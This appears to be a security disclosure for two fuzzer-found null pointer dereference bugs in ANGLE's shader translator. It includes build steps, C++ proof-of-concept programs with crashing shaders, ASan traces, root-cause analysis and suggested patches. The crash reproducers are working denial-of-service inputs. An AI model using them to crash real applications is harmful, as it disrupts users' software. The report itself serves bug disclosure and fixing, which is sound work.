# ANGLE Shader Translator — Two Null Pointer Dereference Bugs

**Tested version**: ANGLE HEAD `bb9e1870521d` (2026-04-24)
**Found by**: libFuzzer + AddressSanitizer (release build, `-DNDEBUG -O2`)
**Platform**: macOS x86_64, LLVM/Clang 20.1.3

---

## Build & Reproduction Environment

### Option 1: Using ANGLE's GN build system (recommended for Chromium developers)

```bash
git clone https://chromium.googlesource.com/angle/angle
cd angle
python3 scripts/bootstrap.py
gclient sync

# Generate build with ASan, release mode (asserts disabled)
gn gen out/Asan --args='
  is_debug=false
  is_asan=true
  angle_enable_essl=true
  angle_enable_glsl=true
  angle_enable_hlsl=true
  angle_enable_vulkan=true
  angle_enable_metal=true
  angle_enable_wgpu=true
'

# Build the translator library
autoninja -C out/Asan angle_common translator

# Compile PoC against the built library
# (adjust include/lib paths to match your out/ directory)
clang++ -fsanitize=address -DNDEBUG -O2 -g -std=c++20 \
  -I include -I src -I out/gen/angle \
  poc_bug1_symboltable.cpp \
  -L out/Asan/obj -langle_common -ltranslator \
  -o poc_bug1

./poc_bug1   # → SEGV at SymbolTable.cpp:192
```

### Option 2: Standalone compilation (no depot_tools required)

We provide self-contained PoC `.cpp` files that only depend on the ANGLE translator headers and library. Each PoC calls `sh::Initialize()` / `sh::ConstructCompiler()` / `sh::Compile()` directly.

Build the translator as a static library (all `.cpp` under `src/compiler/translator/`, `src/compiler/preprocessor/`, `src/common/`), then link the PoC:

```bash
clang++ -fsanitize=address -DNDEBUG -O2 -g -std=c++20 \
  -I angle/include -I angle/src \
  -DANGLE_ENABLE_ESSL -DANGLE_ENABLE_GLSL -DANGLE_ENABLE_HLSL \
  -DANGLE_ENABLE_VULKAN -DANGLE_ENABLE_METAL -DANGLE_ENABLE_WGPU \
  poc_bug1_symboltable.cpp \
  -L build -langle_translator_release -lc++ \
  -o poc_bug1

./poc_bug1   # → SEGV at SymbolTable.cpp:192
```

**Key requirement**: Must be compiled with `-DNDEBUG` (release mode). In debug mode, `ASSERT(glPerVertexVar)` fires first as `__builtin_trap()` (SIGILL), masking the underlying null dereference. The real-world risk is in release builds where ASSERT is a no-op.

---

## Bug 1: Null Pointer Dereference in `TSymbolTable::setGlInArraySize`

### Summary

A null pointer dereference occurs in `SymbolTable.cpp:192` when compiling a geometry shader that declares an input array variable, if the `gl_in` built-in was not registered in the symbol table (because `EXT_geometry_shader` / `OES_geometry_shader` is not enabled in `ShBuiltInResources`).

### Impact

- **CWE**: CWE-476 (NULL Pointer Dereference)
- **Crash type**: SEGV on READ at address `0x18` (null + struct member offset)
- **Effect**: Process crash (DoS)
- **Chrome WebGL**: Not reachable — WebGL 2.0 is limited to ES 3.0; geometry shaders require ES 3.1
- **Chrome WebGPU**: Not reachable — WebGPU does not use the GLSL parser path
- **Native GLES 3.1+**: **Reachable** — Android apps using ANGLE's Vulkan backend with `GL_EXT_geometry_shader` can construct geometry shaders. A malicious shader could crash the app.

### Root Cause

`TSymbolTable::setGlInArraySize()` (`SymbolTable.cpp:189`) calls `find(ImmutableString("gl_in"), shaderVersion)` which returns `nullptr` when the geometry shader extension was not enabled in `ShBuiltInResources`. The `ASSERT(glPerVertexVar)` at line 190 is compiled out in release builds (`-DNDEBUG`). Line 192 then dereferences the null pointer:

```cpp
TType *glInType = new TType(static_cast<const TVariable *>(glPerVertexVar)->getType());
//                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
//                          glPerVertexVar is nullptr → SEGV
```

Call chain:
1. `yyparse()` → parses `in vec4 v_position[3];` as geometry shader input
2. `TParseContext::parseSingleArrayDeclaration()` (`ParseContext.cpp:4924`)
3. `TParseContext::checkGeometryShaderInputAndSetArraySize()` (`ParseContext.cpp:4646`)
4. `TSymbolTable::setGlInArraySize()` (`SymbolTable.cpp:189-192`) — **CRASH**

### PoC

File: `poc_bug1_symboltable.cpp`

```cpp
#include "GLSLANG/ShaderLang.h"
int main() {
    sh::Initialize();
    ShBuiltInResources res;
    sh::InitBuiltInResources(&res);
    // Do NOT set res.EXT_geometry_shader = 1

    const char *shader =
        "#version 310 es\n"
        "#extension GL_EXT_geometry_shader : require\n"
        "layout(triangles) in;\n"
        "layout(triangle_strip, max_vertices = 3) out;\n"
        "in vec4 v_position[3];\n"
        "void main() {\n"
        "    gl_Position = v_position[0];\n"
        "    EmitVertex();\n"
        "}\n";

    ShHandle compiler = sh::ConstructCompiler(
        0x8DD9,          // GL_GEOMETRY_SHADER_EXT
        SH_GLES3_1_SPEC, SH_ESSL_OUTPUT, &res);
    ShCompileOptions options = {};
    options.objectCode = true;
    const char *sources[] = {shader};
    sh::Compile(compiler, sources, 1, options);  // CRASH
    sh::Destruct(compiler);
    sh::Finalize();
}
```

Compile with: `clang++ -fsanitize=address -DNDEBUG -O2 -g poc_bug1.cpp -langle_translator`

### ASan Output

```
ERROR: AddressSanitizer: SEGV on unknown address 0x000000000018
The signal is caused by a READ memory access.
    #0 sh::TSymbolTable::setGlInArraySize(unsigned int, int) SymbolTable.cpp:192
    #1 sh::TParseContext::checkGeometryShaderInputAndSetArraySize(...) ParseContext.cpp:4646
    #2 sh::TParseContext::parseSingleArrayDeclaration(...) ParseContext.cpp:4924
    #3 yyparse(sh::TParseContext*, void*) glslang_tab_autogen.cpp:3226
```

### Suggested Fix

In `SymbolTable.cpp:190`, replace `ASSERT(glPerVertexVar)` with a proper null check:

```cpp
if (!glPerVertexVar)
{
    return false;  // gl_in not found — extension not enabled
}
```

The caller `setGeometryShaderInputArraySize()` (`ParseContext.cpp:5328`) already handles the `false` return by emitting a compile error, so the fix propagates naturally.

---

## Bug 2: Null Pointer Dereference in `OutputHLSL::visitAggregate`

### Summary

A null pointer dereference occurs in `OutputHLSL.cpp:2322` when translating a shader containing `memoryBarrier()` (or other zero-argument built-in functions) to HLSL output. The `default` case in the `visitAggregate` switch statement assumes all unhandled ops are texture/sampler functions with at least one argument, but `memoryBarrier()` has zero arguments.

### Impact

- **CWE**: CWE-476 (NULL Pointer Dereference)
- **Crash type**: SEGV on READ at address `0x0` (null pointer)
- **Effect**: Process crash (DoS)
- **Chrome WebGL**: Not reachable — D3D11 (only HLSL backend) is limited to ES 3.0; `memoryBarrier()` requires ES 3.1
- **Chrome WebGPU**: Not reachable — WebGPU uses WGSL backend, not HLSL
- **Native GLES**: Not currently reachable — ANGLE's D3D11 renderer caps at ES 3.0
- **Latent risk**: The D3D11 code has comments indicating ES 3.1 support is a future possibility. If enabled, this bug becomes reachable.

### Root Cause

`OutputHLSL::visitAggregate()` has a switch statement with:
```cpp
case EOpCallFunctionInAST:
case EOpCallInternalRawFunction:
default:
{
    ...
    else {
        // line 2322: assumes this is a texture function with arguments
        TBasicType samplerType = (*arguments)[0]->getAsTyped()->getType().getBasicType();
        //                       ^^^^^^^^^^^^^^^
        //                       arguments is empty for memoryBarrier() → OOB / null
    }
}
```

`EOpMemoryBarrier` is not handled by any explicit `case` label, so it falls to `default`. The code path then assumes it's a texture function and tries to access the first argument, but `memoryBarrier()` has no arguments. The same bug affects `memoryBarrierAtomicCounter()`, `memoryBarrierBuffer()`, `memoryBarrierShared()`, and potentially `barrier()`.

### PoC

File: `poc_bug2_hlsl.cpp`

```cpp
#include "GLSLANG/ShaderLang.h"
int main() {
    sh::Initialize();
    ShBuiltInResources res;
    sh::InitBuiltInResources(&res);

    const char *shader =
        "#version 310 es\n"
        "precision mediump float;\n"
        "out vec4 fragColor;\n"
        "void main() {\n"
        "    memoryBarrier();\n"
        "    fragColor = vec4(1.0);\n"
        "}\n";

    ShHandle compiler = sh::ConstructCompiler(
        0x8B30,            // GL_FRAGMENT_SHADER
        SH_GLES3_1_SPEC, SH_HLSL_4_1_OUTPUT, &res);
    ShCompileOptions options = {};
    options.objectCode = true;
    const char *sources[] = {shader};
    sh::Compile(compiler, sources, 1, options);  // CRASH
    sh::Destruct(compiler);
    sh::Finalize();
}
```

### ASan Output

```
ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
The signal is caused by a READ memory access.
    #0 sh::OutputHLSL::visitAggregate(sh::Visit, sh::TIntermAggregate*) OutputHLSL.cpp:2322
    #1 void sh::TIntermTraverser::traverse<sh::TIntermAggregate>(...) IntermTraverse.cpp:33
    #2 sh::OutputHLSL::visitBlock(sh::Visit, sh::TIntermBlock*) OutputHLSL.cpp:2045
    ...
    #8 sh::OutputHLSL::output(...) OutputHLSL.cpp:406
    #9 sh::TranslatorHLSL::translate(...) TranslatorHLSL.cpp:202
    #10 sh::TCompiler::compile(...) Compiler.cpp:1303
```

### Suggested Fix

Add explicit `case` labels for barrier ops in `OutputHLSL::visitAggregate()`:

```cpp
case EOpMemoryBarrier:
    out << "AllMemoryBarrier()";
    return false;
case EOpMemoryBarrierBuffer:
    out << "DeviceMemoryBarrier()";
    return false;
case EOpMemoryBarrierShared:
    out << "GroupMemoryBarrier()";
    return false;
case EOpMemoryBarrierAtomicCounter:
    out << "DeviceMemoryBarrier()";
    return false;
case EOpBarrier:
    out << "GroupMemoryBarrier();\nGroupMemoryBarrierWithGroupSync()";
    return false;
```

Or at minimum, add a guard in the `default` block:
```cpp
if (arguments->empty()) {
    UNREACHABLE();
    return false;
}
```

---

## Appendix: OSS-Fuzz Coverage Gap

These bugs were found because the existing OSS-Fuzz `translator_fuzzer` target has limited coverage:

1. **`translator_fuzzer` skips MSL and WGSL backends entirely** — its `kOutputs` array only contains ESSL, GLSL, HLSL, and SPIRV
2. **`translator_fuzzer` uses binary-format input** — the first bytes control shader type/spec/output, wasting fuzzer energy on format exploration rather than shader content
3. **Geometry shader type is not tested** — `translator_fuzzer` only tests vertex and fragment shaders

Our harness covers all 6 output backends (ESSL, GLSL, HLSL, SPIRV, MSL, WGSL) and all 4 shader types (vertex, fragment, compute, geometry) with text-based input.

### Statistics

| Metric | Value |
|--------|-------|
| Total fuzzing time | ~13h (release), ~14h (debug) |
| Total executions | 15.7M (release) |
| Edge coverage | 21,947 |
| Total crash files | 138 (debug ASSERT) + 57 (release real) |
| Unique ASSERT bugs | ~8 types |
| Unique real null-deref bugs | 2 types |
| Crash files in MSL/WGSL paths | 31 (OSS-Fuzz blind spot) |
